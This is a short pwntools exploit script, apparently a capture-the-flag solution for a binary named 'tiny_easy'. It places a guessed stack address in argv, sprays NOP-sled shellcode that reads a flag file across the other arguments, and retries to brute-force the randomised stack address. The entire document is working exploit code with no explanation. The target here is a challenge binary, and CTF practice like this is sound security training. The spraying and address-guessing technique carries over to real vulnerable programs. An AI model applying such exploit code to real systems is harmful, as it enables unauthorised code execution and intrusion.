#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

PROGRAM_START = 0x8048054
ARGV_ADDR_GUESS = 0xffb19008

for _ in range(64):
    io = process(executable=b"./tiny_easy", argv=[p32(ARGV_ADDR_GUESS)] + [asm(shellcraft.cat(b"flag") + shellcraft.exit(0)).rjust((1 << 17) - 128, b"\x90")] * 10, env={})

    time.sleep(1)

    if io.poll() in (0, None):
        break
else:
    log.error("failed to guess stack address")

log.success("exploit succeeded!")

print(io.recvline())
